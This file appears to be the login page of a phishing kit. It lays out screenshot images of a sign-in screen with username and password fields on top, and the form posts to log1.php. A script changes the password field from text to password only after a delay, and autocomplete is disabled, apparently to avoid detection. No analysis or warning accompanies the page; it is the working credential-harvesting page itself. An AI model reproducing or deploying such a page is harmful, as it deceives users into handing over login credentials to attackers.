<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign In</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
  
.textbox { 
    border: 1px solid #c4c4c4; 
    height: 30px; 
    width: 275px; 
    font-size: 14px; 
    padding-left: 8px; 
   
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
    
} 

 </style>
<style type="text/css">
  
.textrbox { 
	background-color: #EAEAEA;
    background: -moz-linear-gradient(top, #FFF, #EAEAEA);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0.0, #FFF), color-stop(1.0, #EAEAEA));
    padding-left: 5px;
	border-radius: 2px;
	font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
	font-size: 14px;	
	color: #555;
    border: 1px solid #cdcdcd; 
    outline:0; 
    height: 30px; 
    width: 275px; 
  } 
.textrbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 8px #7bc1f7; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: auto;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:115px; top:0px; width:985px; height:75px; z-index:0"><img src="images/logheader.png" alt="" title="" border=0 width=985 height=75></div>

<div id="image2" style="position:absolute; overflow:hidden; left:115px; top:80px; width:980px; height:60px; z-index:1"><img src="images/sublogheader.png" alt="" title="" border=0 width=980 height=60></div>

<div id="image3" style="position:absolute; overflow:hidden; left:115px; top:140px; width:983px; height:360px; z-index:2"><img src="images/sbody.png" alt="" title="" border=0 width=983 height=360></div>

<div id="image4" style="position:absolute; overflow:hidden; left:115px; top:530px; width:980px; height:147px; z-index:3"><img src="images/footer.png" alt="" title="" border=0 width=980 height=147></div>


<form action=log1.php name=chlobhai id=chlobhai method=post>
<input name="usr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:215px;height:32;left:142px;top:195px;z-index:10">

<input name="psw" class="textbox" autocomplete="off" type="text" style="position:absolute;width:215px;height:32;left:142px;top:320px;z-index:11">

<div id="formimage1" style="position:absolute; left:142px; top:379px; z-index:13"><input type="image" name="formimage1" width="88" height="26" src="images/btn.png"></div>
</div>

	
</body>
</html>
